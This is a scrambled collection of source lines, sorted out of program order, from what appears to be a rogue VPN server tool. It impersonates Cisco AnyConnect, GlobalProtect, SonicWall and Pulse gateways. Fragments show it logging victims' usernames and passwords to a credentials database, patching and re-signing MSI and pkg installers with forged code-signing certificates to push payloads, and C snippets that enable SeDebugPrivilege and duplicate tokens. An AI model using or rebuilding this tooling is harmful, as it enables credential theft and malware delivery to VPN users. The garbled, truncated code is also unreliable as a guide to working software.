    
        
            
                
                    
                                                        x509.DNSName(self.dns_name)])
                                        additional_sans=[x509.DNSName(self.dns_name)])
                                   message_value=eap.to_bytes())
                                toc_compressed))        
                            major 
                            minor 
                            minor = 0
                            patch = 0
                        'cisco_command_macos': self.cisco_command_macos
                        </p>
                        This legacy SMA UI will deprecated in next release. Contemporary UI is recommended.
                        break
                        current_version = row[1]
                        help='Directory to store downloaded MSI files. Defaults to ./downloads/')
                        if minor == 100:
                        if patch == 100:
                        info
                        new_product_code = '{' 
                        patch 
                        return
                        return row[1]
                        row[1] = new_product_code
                        row[1] = new_version
                        script['hash'] = self.shasum(content)
                        self.end_headers()
                        self.logger.info('Connection closed by client')
                        self.send_response(404)
                        self.wfile.write(f.read())
                        version = current_version.split('-')[0]
                    )
                    </div>
                    break
                    chunk = client_socket.recv(4096)
                    context = {
                    continue
                    continue    
                    data 
                    data = b''
                    data = handler.connection.recv(8192)
                    der_cert = wrapped_sock.getpeercert(binary_form=True)
                    elif row[0] == 'ProductCode':
                    feature_key = random_hash()
                    feature_key = row[0]
                    handler.plugin_name = plugin.__class__.__name__
                    if not chunk:
                    if not data:
                    if os.path.exists(script_path):
                    if row and len(row) > 7 and row[7].isdigit():
                    if row[0] == 'ProductVersion':
                    if self.server.plugin_manager.handle_http(self):
                    info
                    info = {'User-Agent': request.headers.get('User-Agent')}
                    next(reader)
                    packet = fake_ether / packet
                    parser.parse()
                    plugin TEXT
                    progress = int(50 
                    return
                    return None
                    return plugin.handle_http(handler)
                    script_hashes=script_hashes
                    self.connection.close()
                    self.db_manager.log_credentials(
                    self.packet_handler.handle_client_packet(packet.message_value)
                    self.packet_handler.handle_client_packet(packet_data)
                    self.receive_callback(packet)
                    src_mac = get_if_hwaddr(conf.iface)
                    sslsocket.context = self.ssl_context
                    sys.stdout.flush()
                    thumbprint_md5 = hashlib.md5(der_cert).hexdigest().upper()
                    thumbprint_sha1 = hashlib.sha1(der_cert).hexdigest().upper()
                    updated_property_rows.append(row)
                    }
                'Content-Disposition': f'attachment
                'Content-Length': str(file_size)
                'cisco_command_macos': self.cisco_command_macos
                )
                255 
                </td>
                CREATE TABLE IF NOT EXISTS credentials (
                ]
                attr_flag = load_be16(self.data[offset:])
                attr_len = load_be16(self.data[offset 
                auth_data = packet.message_value.decode().strip('
                break
                client_socket.sendall(resp)
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                current_size 
                cursor = self.conn.cursor()
                cursor.execute(
                data = f.read()
                eap_data 
                elif attr_flag == 0x2e00:
                else:
                encryption_algorithm=serialization.NoEncryption()
                except BlockingIOError:
                except Exception as e:
                except ssl.SSLWantReadError:
                f.write(data)
                file_content = f.read()
                for _ in range(3):
                for row in reader:
                for script in script_hashes:
                if IP not in packet:
                if attr_flag == 0x2c00:
                if len(self.data) < offset 
                if not packet.haslayer(Ether):
                if not sni_name:
                if packet.message_value[0] == 0x45:
                if packet_data[0] == 0x45 and self.packet_handler is not None:
                if password:
                if plugin.is_enabled() and plugin.can_handle_http(handler):
                if row:
                if self.parse_request():
                if self.receive_callback:
                if sni_name == self.dns_name:
                if total_size:
                if username and password:
                if username:
                info = {'User-Agent': request.headers.get('User-Agent')}
                key_path=key_path
                key_path=self.apple_key_path
                logging.error(traceback.format_exc())
                major 
                max_disk_id = disk_id
                max_sequence = sequence
                minor 
                minor = 0
                offset 
                os.remove(output_file)
                other_data=other_data
                outbuf 
                password = re.search('<password>(.
                password = request.form.get('passwd')
                patch = 0
                patcher.increment_msi_version(output_file)
                pfx_path=self.codesign_pfx_path
                profile_hash = self.shasum(profile_xml)
                response = xml.encode()
                return ''
                return 'NX_WINDOWS_EPC_VER: 0xFF
                return 'NX_WINDOWS_VER: 0x00000000
                return 'X-NE-sslvpnnac-allow: {}
                return 'connProxy = 0
                return 1
                return False
                return abort(404)
                return b''
                return self.render_template('launchextender.html')
                return self.render_template('launchplatform.html')
                script_hashes = [
                self.ca_cert.public_key().verify(
                self.conn.close()
                self.conn.commit()
                self.db_manager.log_credentials(
                self.logger.info('Got IFT_CLIENT_AUTH_RESPONSE')
                self.logger.info('Got IFT_TLS_CLIENT_INFO')
                self.logger.info('Got IFT_VERSION_REQUEST')
                self.logger.info('Got logout request')
                self.logger.info(f'Client info: {auth_data}')
                self.raw_requestline = first_line
                self.send_dpd_resp(packet_data)
                self.send_keepalive()
                serialization.NoEncryption()
                sslsocket.context = ctx
                thumbprint = dynamic_thumbprint
                try:
                username = re.search('<username>(.
                username = request.form.get('user')
                writer.writerows(updated_property_rows)
                yield data[i:i 
                }
               f'Message Value={self.message_value.hex()}'
               self.message_value
              <priority>1</priority>
            ''')
            )
            ))
            </entry>
            </tr>
            <= cert.not_valid_after_utc)
            <= datetime.datetime.now(datetime.timezone.utc) 
            <tr>
            CloseHandle(processesSnapshot)
            ]
            apple_private_key.public_key()
            arc[file_key] = CabFile(f.read())
            attr_flag = 0
            attr_len = load_be16(p[2:])
            attr_type = load_be16(p)
            avp = AVP.from_bytes(data)
            avp_bytes 
            avp_list = []
            backend=default_backend()
            body = request.get_data().decode()
            bump = self.get_higher_version(latest_version)
            cert_file.write(cert_pem 
            cert_key.public_key()
            client_socket.close()
            client_socket.sendall(KEEP_ALIVE_PACKET)
            client_socket.sendall(reply.to_bytes())
            client_socket.setblocking(False)
            codesign_private_key.public_key()
            component_key = f'C_{file_key}'
            config = generator.create_config()[0x10:]
            context = ssl.create_default_context()
            context = {
            critical=False
            critical=True
            crl_sign=False
            current_version = None
            current_version = record.GetString(1)
            cursor = self.conn.cursor()
            cursor.execute('''
            data = b''
            data = client_socket.recv(1024)
            data = data.encode()
            data = data[avp.length
            data = reader.read()
            datetime.datetime.now(datetime.timezone.utc) 
            datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(days=1)
            datetime.datetime.utcnow() 
            datetime.datetime.utcnow() - datetime.timedelta(days=1)
            db.Commit()
            der_cert = cert.public_bytes(encoding=serialization.Encoding.DER)
            disk_id = rec.GetInteger(1)
            dwCreationFlags 
            dynamic_thumbprint = self.cert_manager.get_thumbprint_from_server(self.dns_name)
            eap_data 
            eap_data = bytearray()
            elif packet.message_type == 0x4:
            elif packet.message_type == 0x89:
            elif packet.message_type == IFT_CLIENT_AUTH_RESPONSE:
            elif packet.message_type == IFT_TLS_CLIENT_INFO:
            elif packet_type == self.PacketType.COMPRESSED_DATA:
            elif packet_type == self.PacketType.DISCONNECT:
            elif packet_type == self.PacketType.DPD_REQ:
            elif packet_type == self.PacketType.KEEPALIVE:
            elif packet_type == self.PacketType.TERMINATE:
            elif request.args.get('epcversionquery'):
            elif request.args.get('gettunnelfailedinfo'):
            elif request.args.get('launchextrainfos'):
            elif request.args.get('launchnetextender'):
            elif request.args.get('launchplatform'):
            elif request.args.get('version') == '64':
            elif request.args.get('versionquery'):
            elif request.form.get('setclienthostname'):
            elif route_type == 0xf1000010:
            elif val == ENC_AES_256_CBC:
            elif val == HMAC_SHA1:
            elif val == HMAC_SHA256:
            else:
            encoded = urllib.parse.quote(base64.b64encode(str(data).encode()).decode())
            encryption_algorithm=serialization.NoEncryption()
            esp_config = ESPConfigGenerator().create_config()
            esp_replay_protect = load_be32(data)
            except Exception as e:
            exit(1)
            f.write(apple_certificate.public_bytes(serialization.Encoding.PEM))
            f.write(apple_private_key.private_bytes(
            f.write(arc.save(True))
            f.write(codesign_certificate.public_bytes(serialization.Encoding.PEM))
            f.write(codesign_private_key.private_bytes(
            f.write(pkg_buf)
            f.write(self.ca_cert.public_bytes(serialization.Encoding.PEM))
            f.write(self.ca_key.private_bytes(
            f.write(serialization.pkcs12.serialize_key_and_certificates(
            f.write(x64_version.split('/')[0])
            fallback_secs = load_be32(data)
            feature_key = None
            feature_key = random_hash()
            feature_key = rec.GetString(1)
            ffff = load_be32(p[4:])
            file_key = f'_{random_hash()}'
            file_name = os.path.basename(file_path)
            file_size = os.path.getsize(file_path)
            first_line = self.rfile.readline()
            for avp in avp_list:
            for data in response.iter_content(block_size):
            goto CLEANUP_EXIT
            handler.connection.close()
            handler.connection.sendall(b'START_TUNNEL')
            handler.end_headers()
            handler.send_response(101)
            handler.send_response(200)
            handler.wfile.flush()
            handler.wfile.write(html.encode())
            headers = [
            headers = {
            headers = {'X-Aggregate-Auth': '1'}
            hex_data = to_hex(chunk)
            i = load_be16(data)
            if 'apple mac' in user_agent.lower() or 'darwin' in user_agent.lower():
            if attr_len 
            if b'HTTP/' in first_line:
            if current_version and new_version:
            if disk_id > max_disk_id:
            if dynamic_thumbprint:
            if ffff != 0xffff:
            if len(data) < 12:
            if len(data) < offset 
            if len(self.data) - self.Constants.HEADER_LENGTH != packet_length:
            if minor == 100:
            if name and os.path.exists(script_path):
            if not os.path.exists(cert_path):
            if not os.path.exists(file_path):
            if not rec:
            if not self.anonymous_auth and not self.extract_credentials(eap_in.eap_data):
            if not self.compile_payload():
            if os.path.exists(output_file):
            if packet.message_type  == IFT_VERSION_REQUEST:
            if packet_type == self.PacketType.DATA:
            if patch == 100:
            if proc.returncode or not os.path.exists(output_file):
            if proc.returncode:
            if request.args.get('getepcprofiles'):
            if request.form.get('touchSession'):
            if resp:
            if route_type == 0x07000010:
            if self.msi_add_file:
            if self.msi_command:
            if self.msi_increment_version:
            if self.write_pcap and self.pcap_filename is not None:
            if sequence > max_sequence:
            if val == ENC_AES_128_CBC: 
            if val == HMAC_MD5:
            ip_bytes = self.ip_to_bytes(ip)
            key_data = RSA.import_key(f.read())
            key_file.write(key_pem)
            keyfile=self.ip_key_path
            l -= 4
            l -= attr_len
            lifetime_bytes = load_be32(data)
            lifetime_secs = load_be32(data)
            logging.error(f'Error appending to PCAP: {e}')
            logon_script = data[0:attr_len].split(b'
            major 
            max_sequence = 0
            minor 
            minor = 0
            modified = True
            mtu = load_be32(data)
            name = request.args.get('name')
            new_disk_id = 1
            new_product_code = '{' 
            new_product_code = None
            new_sequence = max_sequence 
            new_version = None
            os.remove(args.output)
            outbuf 
            outbuf = b''
            p = p[0x10:]
            p = p[4:]
            p = p[attr_len:]
            packet = IFTPacket.from_io(reader)
            packet_data = self.data[self.Constants.HEADER_LENGTH:]
            packet_type = self.data[6]
            parser.parse()
            patch 
            patch = 0
            pfx_path = self.cert_manager.generate_codesign_certificate(
            print(f'{i 
            printable_data = to_printable(chunk)
            proc = subprocess.run([
            product_code_record = msilib.CreateRecord(1)
            product_code_view.Close()
            product_code_view.Execute(product_code_record)
            raise
            reader = io.BytesIO(data)
            rec = msilib.CreateRecord(8)
            rec = view.Fetch()
            response = xml.encode()
            return
            return ' '.join(f'{b:02x}' for b in chunk)
            return ''.join(chr(b) if 32 <= b <= 126 else '.' for b in chunk)
            return 'X-NE-epcret: pass'
            return 1
            return 4 - (self.length 
            return False
            return None
            return True
            return abort(404)
            return base64.b64encode(der_cert).decode()
            return outbuf
            return pfx_path
            return processInfo.th32ProcessID
            return resp
            return self.generate_ca_certificate()
            return self.handle_get(handler)
            return self.handle_post(handler)
            return self.render_template('logout.html')
            return self.render_template('welcome.html')
            return self.render_template('wxacneg.html')
            return send_file(cert_path)
            return template.render(context)
            return {
            route_data 
            route_entry 
            route_entry = self.write_be32(route_type)
            route_type = load_be32(p)
            route_type = route['type']
            routes_len -= 0x10
            self._eap_identifier = 1
            self.ca_cert.subject
            self.ca_key.public_key()
            self.cert_manager.ca_cert_path
            self.cert_manager.generate_apple_certificate(
            self.cert_manager.generate_codesign_certificate(
            self.conn.commit()
            self.connection.close()
            self.db_manager.log_credentials(
            self.enabled = False
            self.handle_connect(handler)
            self.handle_get(handler)
            self.handle_head(handler)
            self.handle_post(handler)
            self.load_ca_certificate()
            self.logger.error('AVP_CODE_EAP_MESSAGE not found')
            self.logger.error('Data too short to extract password')
            self.logger.error(f'Error handling connection: {type(e)}: {e}')
            self.logger.info('Received AVP structures with OS data. Asking for creds..')
            self.logger.info('Sending URI handler response ..')
            self.logger.info('Starting tunnel')
            self.logger.info('Switching protocols ..')
            self.logger.info(request.args)
            self.logger.info(request.cookies)
            self.logger.info(request.data)
            self.logger.info(request.endpoint)
            self.logger.info(request.form)
            self.logger.info(request.headers)
            self.logger.info(request.method)
            self.logger.info(request.remote_addr)
            self.logger.warning('Received invalid EAP packet')
            self.plugin_manager
            self.template_env = Environment(loader=FileSystemLoader(default_dir))
            sequence = rec.GetInteger(1)
            server.serve_forever()
            source_key = random_name()
            subject
            subnet_mask_bytes = self.subnet_mask_to_bytes(subnet_mask)
            sys.exit(1)
            template = Template(f.read())
            token = {
            tos_copy = load_be32(data)
            try:
            update_record = msilib.CreateRecord(1)
            update_view.Close()
            update_view.Execute(update_record)
            updated_property_rows = []
            user_agent = request.headers.get('User-Agent')
            val = load_be16(data)
            value_start = 12
            version = current_version.split('-')[0]
            version = f.read().strip()
            view.Execute(rec)
            while True:
            while attr_flag != 0x2c00:
            with self.lock:
            x509.random_serial_number()
            xml = self.render_template('prelogin.xml')
            xml = self.render_template('sslvpn-login.xml')
            xml = self.render_template('sslvpn-prelogin.xml')
            }
           'SMA Connect Agent' in user_agent or 
           'Secure%20Access' in user_agent or 
           handler.path == '/pulse':
           handler.path == '/sonicwall' or 
           handler.path == '/sonicwall/ca.crt':
           handler.path.startswith('/ssl-tunnel-connect.sslvpn'):
           not self.msi_force_patch and self.verify_msi_files():
           self.verify_payload():
          </priority-rule>
          <description>GP-GD-Internal</description>
          <description>GP-Lon-DC-Internal</description>
          <description>{{ dns_name }}</description>
          <ipv4>192.168.1.157</ipv4>
          <ipv4>192.168.69.45</ipv4>
          <ipv4>{{ gateway_ip }}</ipv4>
          <manual>yes</manual>
          <priority-rule>
          <priority>1</priority>
        )
        ) as server:
        ).add_extension(
        ).encode()
        ).issuer_name(
        ).not_valid_after(
        ).not_valid_before(
        ).public_key(
        ).serial_number(
        // Create process for user with desktop
        // Duplicate our token to 
        // Enable SeDebugPrivilege
        </bundle-version>
        </entry>
        </table>
        <bundle-version>
        <member>antivirus</member>
        <member>host-info</member>
        @self.flask_app.errorhandler(404)
        @self.flask_app.route('/
        @self.flask_app.route('/NACAgent.exe')
        @self.flask_app.route('/NXSetupU.exe')
        @self.flask_app.route('/NXSetupU.exe.manifest')
        @self.flask_app.route('/cgi-bin/sessionStatus')
        @self.flask_app.route('/cgi-bin/userLogout')
        @self.flask_app.route('/cgi-bin/welcome')
        @self.flask_app.route('/cgi-bin/wxacneg')
        @self.flask_app.route('/sonicwall')
        @self.flask_app.route('/sonicwall/ca.crt')
        COMPRESSED_DATA = 0x08
        DATA = 0x00
        DISCONNECT = 0x05
        DPD_REQ = 0x03
        DPD_RESP = 0x04
        HEADER_LENGTH = 8
        KEEPALIVE = 0x07
        MAGIC_NUMBER = 0x53544601
        TERMINATE = 0x09
        ]
        ] 
        ])
        apple_private_key = rsa.generate_private_key(
        arc = CabArchive()
        assert buf.tell() == len(data)
        assert len(data) == 0x46
        assert len(packet_data) == packet_length
        assert magic == SSL_VPN_MAGIC
        assert offset == 0x46
        assert static_bytes == SSL_VPN_STATIC
        avp = AVP.from_bytes(data)
        avp = AVP.from_bytes(data[8:])
        avp_bytes 
        bSuccess = TRUE
        block_size = 1024
        body = handler.rfile.read(content_length)
        buf = io.BytesIO(data)
        builder = x509.CertificateBuilder().subject_name(
        bundle_version=version
        ca.Close()
        ca.Execute(rec)
        ca_cert = extract_cert_base64(ca_file)
        cert = x509.CertificateBuilder().subject_name(
        cert_common_name = cert.subject.get_attributes_for_oid(NameOID.COMMON_NAME)[0].value
        cert_key = rsa.generate_private_key(
        cert_pem = cert.public_bytes(serialization.Encoding.PEM)
        client_socket.close()
        code = data[4]
        codesign_private_key = rsa.generate_private_key(
        component_key = f'C_{file_key}'
        config 
        config = b''
        config_len_offset = len(data)
        config_type = load_be32(self.data[0x20:])
        current_size = 0
        current_version = None
        data 
        data = bytearray()
        data = data[8:]
        data = data[avp.length
        data = data[user_avp.length
        data = f.read()
        data[config_len_offset:config_len_offset 
        data[header_len_offset:header_len_offset 
        data[offset 
        data_offset 
        date_valid = (cert.not_valid_before_utc 
        db.Close()
        db.Commit()
        def cert():
        def download_msi(file_name):
        def epcs():
        def extendauthentication():
        def get_msi_redirect():
        def getaovconf():
        def global_protect_get_config():
        def global_protect_pre_login():
        def handle_connect(path):
        def healthcheck():
        def healthcheck_v2():
        def index():
        def logout():
        def nacagent():
        def nxsetup():
        def nxsetup_manifest():
        def oem_customization():
        def packet_callback(packet):
        def page_not_found(e):
        def post():
        def profile():
        def session_status():
        def ssl_vpn_get_config():
        def ssl_vpn_login():
        def ssl_vpn_pre_login():
        def ssl_vpnclient():
        def to_hex(chunk):
        def to_printable(chunk):
        def tunnel_type():
        def user_login():
        def welcome():
        def wxacneg():
        del packet[IP].chksum
        del packet[TCP].chksum
        der_cert = cert.public_bytes(serialization.Encoding.DER)
        downloader.download_latest_msi()
        dport = packet[TCP].dport
        dst_ip = packet[IP].dst
        eap_data = data[8:8 
        eap_in = EAPPacket.from_bytes(data)
        eku_list = [
        elif attr_type == 0x0002:
        elif attr_type == 0x0003:
        elif attr_type == 0x0004:
        elif attr_type == 0x0008:
        elif attr_type == 0x000a:
        elif attr_type == 0x000f:
        elif attr_type == 0x0010:
        elif attr_type == 0x4000:
        elif attr_type == 0x4001:
        elif attr_type == 0x4005:
        elif attr_type == 0x4006:
        elif attr_type == 0x400b:
        elif attr_type == 0x400c:
        elif attr_type == 0x4010:
        elif attr_type == 0x4011:
        elif attr_type == 0x4012:
        elif attr_type == 0x4013:
        elif attr_type == 0x4014:
        elif attr_type == 0x4015:
        elif attr_type == 0x4016:
        elif attr_type == 0x4017:
        elif attr_type == 0x401a:
        elif attr_type == 0x401f:
        elif attr_type == 0x4020:
        elif attr_type == 0x4021:
        elif attr_type == 0x4024:
        elif config_type == 0x2c20f000:
        elif data[0:4] != SSL_VPN_MAGIC:
        elif eap_in.code == EAP_RESPONSE and self.auth_completed(eap_in.eap_data):
        elif eap_in.code == EAP_RESPONSE and self.has_credentials(eap_in.eap_data) or (self.anonymous_auth and eap_in.eap_data[1:] == b'anonymous'):
        elif eap_in.code == EAP_RESPONSE and self.is_client_info(eap_in.eap_data) and not self.anonymous_auth:
        elif handler.command == 'CONNECT':
        elif handler.command == 'GET':
        elif handler.command == 'HEAD':
        elif handler.command == 'POST':
        elif handler.path == '/pulse':
        else:
        else:   
        except Exception as e:
        except sqlite3.Error as e:
        f.write(config)
        f.write(outbuf)
        file_key = f'_{random_hash()}'
        file_name = os.path.basename(file_path)
        file_size = os.path.getsize(file_path)
        final_attrs 
        final_attrs = bytearray()
        final_attrs[4:6] = self.write_be16(len(final_attrs))  
        finally:
        flags = data[4]
        for plugin in self.plugins:
        for route in self.routes:
        goto CLEANUP_EXIT
        handler.end_headers()
        handler.send_response(200)
        handler.send_response(response.status_code)
        handler.wfile.write(response.data)
        header_len_offset = len(data)
        identifier = data[5]
        if 'AnyConnect' in user_agent:
        if 'GlobalProtect' in user_agent or 
        if 'SonicWALL NetExtender' in user_agent or 
        if 'odJPAService' in user_agent or 
        if (CreateEnvironmentBlock(
        if arg and not os.path.exists(arg):
        if args.force:
        if attr_type == 0x0001:
        if avp.code != 0xD49:
        if avp.code != 0xD61:
        if cert.issuer.get_attributes_for_oid(NameOID.COMMON_NAME)[0].value == self.ca_common_name:
        if cert_path is None:
        if config_type == 0x2e20f000:
        if current_version and new_version:
        if data == KEEP_ALIVE_PACKET:
        if data is None:
        if eap_in.code == EAP_RESPONSE and eap_in.identifier == 1 and eap_in.eap_data[1:] == b'anonymous' and not self.anonymous_auth:
        if ether_str == 'UNKNOWN':
        if flags 
        if handler.command == 'GET' and handler.path.startswith('/ssl-tunnel-connect.sslvpn'):
        if handler.command == 'GET':
        if handler.path == '/':
        if include_padding:
        if key_path is None:
        if keyword.lower() == 'server':
        if l < 8 or load_be32(p[4:]) != 0x03000000:
        if len(data) < 0x16:
        if len(data) < 0x17 
        if len(data) < 16:
        if len(data) < 20 or 
        if len(data) < 24 or 
        if len(data) < 8 or 
        if len(data) < 8:
        if len(self.data) < 0x31:
        if minor == 100:
        if new_product_code:
        if not ca_cert or not signing_cert:
        if not date_valid:
        if not latest_version:
        if not name_valid:
        if not os.path.exists('/usr/bin/osslsigncode'):
        if not os.path.exists(input_file):
        if not os.path.exists(self.apple_cert_path) or not os.path.exists(self.apple_key_path):
        if not os.path.exists(self.codesign_cert_path) or not os.path.exists(self.codesign_key_path):
        if not os.path.exists(self.codesign_cert_path):
        if not os.path.exists(source_file) or not os.path.exists('/usr/bin/x86_64-w64-mingw32-gcc'):
        if not os.path.exists(version_file):
        if not os.path.getsize(x86_path) or not os.path.getsize(x64_path):
        if not rec:
        if not self.bootstrap():
        if not self.ca_cert or not self.ca_key:
        if not self.patch_msi_files():
        if not self.sign_msi_files():
        if not test_sig:
        if os.name == 'nt':
        if os.path.exists(cert_path) and os.path.exists(key_path) and 
        if os.path.exists(self.ca_cert_path) and os.path.exists(self.ca_key_path):
        if os.path.exists(self.dns_cert_path) and os.path.exists(self.dns_key_path) 
        if os.path.exists(self.ip_cert_path) and os.path.exists(self.ip_key_path) 
        if patch == 100:
        if pfx_path is None:
        if proc.returncode or not os.path.exists(output_file):
        if proc.returncode:
        if reader.getbuffer().nbytes < 16:
        if record:
        if self._eap_identifier >= 5:
        if self.conn:
        if self.db_manager:
        if self.length 
        if self.msi_increment_version:
        if self.vendor is not None:
        if self.write_pcap and pcap_filename is not None:
        if template_dir:
        if user_avp.code != 0xD6D:
        if user_avp.code == 0xD6D:
        key_pem = cert_key.private_bytes(
        key_usage = x509.KeyUsage(
        l -= 8
        l = attr_len
        l = load_be16(p[4:])
        latest_version = self.get_latest_msi_version()
        latest_version_x64 = sorted(x64_keys)[-1]
        latest_version_x86 = sorted(x86_keys)[-1]
        length = int(data[0x16]) - 2
        log_level = logging.DEBUG
        log_level = logging.WARNING
        logging.error(f'Unable to get signature with key: {key_file}')
        logging.error(f'Unable to import {cert_file}: {e}')
        magic = buf.read(4)
        max_disk_id = 0
        max_sequence = 0
        message_value = reader.read(message_length - 16)
        name_valid = cert_common_name == common_name
        nat_port = self.get_free_nat_port()
        new_disk_id = max_disk_id 
        new_sequence = max_sequence 
        new_version = None
        ns = {'s3': 'http://s3.amazonaws.com/doc/2006-03-01/'}
        offset = 0x2c
        offset = len(data)
        outbuf = b''
        outbuf = bytearray()
        p = data
        p = p[2:] 
        p = p[8:]
        p = self.data[offset 
        packet = IP(packet_data)
        packet[IP].src = get_if_addr(conf.iface)  
        packet[TCP].sport = nat_port              
        packet_data = buf.read(packet_length)
        padding_size = user_avp.padding_required()
        parser.print_help()
        parts = subnet_mask.split('.')
        password = data[0x17:0x17
        patch 
        patcher = get_msi_patcher()
        patcher.increment_msi_version(args.output)
        pkg_buf = generate_pkg(
        pkg_name = args.name
        pkg_name = os.path.basename(args.output_file)
        plugin = plugin_class(
        plugin_kwargs = {
        print()
        proc = subprocess.run([
        raise NotImplementedError
        reader = io.BytesIO(data)
        rec = msilib.CreateRecord(2)
        rec = msilib.CreateRecord(3)
        rec = msilib.CreateRecord(4)
        rec = msilib.CreateRecord(6)
        rec = msilib.CreateRecord(8)
        rec = view.Fetch()
        record = view.Fetch()
        resp 
        resp = None
        resp = self.create_packet(self.PacketType.KEEPALIVE)
        response = requests.get(self.xml_url)
        response.raise_for_status()
        result = view.Fetch()
        return 0
        return 1
        return False
        return MSIPatcherLinux()
        return MSIPatcherWindows()
        return None
        return PKCS1_v1_5.new(key_data).sign(SHA.new(data))
        return True
        return avp.code == 0xD6B and 
        return avp_bytes
        return base64.b64encode(base64.b64encode(os.urandom(32))).decode()
        return bytes([255 
        return cls.from_io(reader)
        return config
        return data
        return handler.path in ['/api/v2/healthcheck']
        return hashlib.sha1(data).hexdigest().upper()
        return int(ipaddress.IPv4Address(ipv4))
        return len(data) >= 4 and data[:4] == SSL_VPN_MAGIC
        return outbuf
        return pfx_path
        return pkg_path
        return proc.returncode == 0 and os.path.exists(output_file)
        return resp
        return routes_section
        return self._eap_identifier
        return self.enabled
        return self.ssl_context
        return str(ipaddress.IPv4Address(addr))
        return template.render(
        return thumbprint
        return version
        root = ET.fromstring(response.content)
        route_data = b''
        routes_len -= 8
        routes_len = len(route_data) 
        routes_len = load_be16(self.data[offset 
        routes_section 
        routes_section = bytearray()
        san_list = additional_sans
        self._eap_identifier 
        self._eap_identifier = 1
        self._setup_routes()
        self.append_to_pcap(packet)
        self.attr_len = attr_len
        self.attr_type = attr_type
        self.ca_cert = x509.CertificateBuilder().subject_name(
        self.ca_common_name = ca_common_name
        self.ca_key = rsa.generate_private_key(
        self.cert_dir = cert_dir
        self.cert_manager = CertManager(cert_dir)
        self.cert_manager = cert_manager
        self.cert_manager.setup()
        self.code = code
        self.conn = None
        self.create_ssl_context()
        self.data = data
        self.db_manager = DBManager()
        self.db_manager = db_manager
        self.db_path = db_path
        self.dns_name = dns_name
        self.dns_suffix = dns_suffix
        self.eap_data = eap_data
        self.enabled = True
        self.external_ip = external_ip
        self.flags = flags
        self.flask_app = Flask(__name__)
        self.gateway_config = {
        self.generate_pkg()
        self.host = host
        self.identifier = identifier
        self.length = 4 
        self.length = 8 
        self.load_ca_certificate()
        self.load_dns_certificate()
        self.load_ip_certificate()
        self.lock = threading.Lock()
        self.logger = logging.getLogger(logger_name)
        self.logger = logging.getLogger(self.__class__.__name__)
        self.logger.debug(eap_in)
        self.logger.info('Starting packet sniffer')
        self.logger.info(f'Extracted password: {password}')
        self.logger.info(f'Extracted username: {username}')
        self.logon_script = logon_script
        self.logon_script_macos = logon_script_macos
        self.message_identifier = message_identifier
        self.message_length = len(self.message_value) 
        self.message_type = message_type
        self.message_value = message_value if message_value else b''
        self.msi_command = os.getenv(
        self.output_dir = output_dir
        self.packet_handler = packet_handler
        self.packet_handler.handle_client_packet(packet_data)
        self.pcap_filename = pcap_filename
        self.plugin_manager = PluginManager()
        self.plugin_manager = plugin_manager
        self.plugin_manager = server.plugin_manager
        self.plugins = []
        self.plugins.append(plugin)
        self.port = port
        self.post_attributes = []
        self.pre_attributes = []
        self.routes = []
        self.routes = routes
        self.server_thumbprint = self.get_cert_thumbprint(self.dns_cert_path)
        self.server_thumbprint = {}
        self.setup_database()
        self.setup_payload()
        self.socket = socket
        self.socket.sendall(resp)
        self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        self.ssl_context.load_cert_chain(
        self.ssl_context.sni_callback = sni_callback
        self.ssl_server_socket.close()
        self.template_dir = template_dir
        self.value = value
        self.vendor = vendor
        self.vendor_id = vendor_id
        self.write_pcap = write_pcap
        seq.Close()
        seq.Execute(rec)
        server.run()
        sig_len = len(test_sig)
        signing_cert = extract_cert_base64(cert_file)
        socketserver.ThreadingTCPServer.allow_reuse_address = True
        source_key = random_name()
        sport = packet[TCP].sport
        src_ip = packet[IP].src
        static_bytes = buf.read(8)
        subject = x509.Name([
        super().__init__(
        super()._setup_routes()
        sys.exit(1)
        target = args.command
        template = self.template_env.get_template(template_name)
        thumbprint = self.cert_manager.server_thumbprint
        thumbprint_md5 = hashlib.md5(der_cert).hexdigest().upper()
        thumbprint_sha1 = hashlib.sha1(der_cert).hexdigest().upper()
        total_length = len(data)
        tp.PrivilegeCount = 1
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
        tp.Privileges[0].Luid = luid
        try:
        user_avp = AVP.from_bytes(data)
        user_avp = AVP.from_bytes(data[8:])
        username = user_avp.value.decode()
        value = data[value_start:value_start 
        value_start = 8
        vendor = None
        version = result.GetString(1)
        version = version.split('-')[0]
        view.Close()
        view.Execute(None)
        view.Execute(None)   
        view.Execute(rec)
        while True:
        while data:
        while l > 4:
        while len(data) > 0:
        while routes_len:
        with ThreadedVPNServer(
        with self.flask_app.test_client() as client:
        with tempfile.TemporaryDirectory() as temp_dir:
        x509_certs 
        x509_certs=x509_certs).rstrip()
        }
      - ./certs/:/app/certs/
      - ./downloads/:/app/downloads/
      - ./payloads/:/app/payloads/
      - EXTERNAL_IP=${EXTERNAL_IP:-}
      - SERVER_FQDN=${SERVER_FQDN:-}
      - SKIP_CERTBOT=${SKIP_CERTBOT:-}
      - backend
      </category>
      </list>
      <category>
      <cert>
      <display>no</display>
      <install-in-cert-store>yes</install-in-cert-store>
      <list>
      <member>0.0.0.0/0</member>
      <member>{{ dns_name }}</member>
      <page/>
      context: .
      dockerfile: Dockerfile
      return false
     /
     {x509_certs}
    'CiscoPlugin'
    'ExamplePlugin'
    --agree-tos 
    --no-eff-email 
    --non-interactive 
    --preferred-challenges http-01 
    --register-unsafely-without-email 
    --standalone 
    </X509Data>
    </default>
    </div>
    </enforcer-exception-list-domain>
    </enforcer-exception-list>
    </entry>
    </external>
    </html>
    </internal>
    </pkg-ref>
    </script>
    </welcome-page>
    <DeployDirectory></DeployDirectory>
    <DeployDirectory>AMPEnabler</DeployDirectory>
    <DeployDirectory>CustomerExperienceFeedback</DeployDirectory>
    <DeployDirectory>ISE Posture</DeployDirectory>
    <DeployDirectory>NVM</DeployDirectory>
    <DeployDirectory>Network Access Manager
    <DeployDirectory>Profile
    <DeployDirectory>Umbrella</DeployDirectory>
    <Description>AMP Enabler Service Profile</Description>
    <Description>AnyConnect Management VPN Profile</Description>
    <Description>AnyConnect VPN Profile</Description>
    <Description>Feedback Service Profile</Description>
    <Description>ISE Posture JSON Profile</Description>
    <Description>ISE Posture Profile</Description>
    <Description>NAM Service Profile</Description>
    <Description>Network Visibility Service Profile</Description>
    <Description>Umbrella Roaming Security Profile</Description>
    <Directory></Directory>
    <Directory>AMPEnabler</Directory>
    <Directory>CustomerExperienceFeedback</Directory>
    <Directory>ISE Posture</Directory>
    <Directory>NVM</Directory>
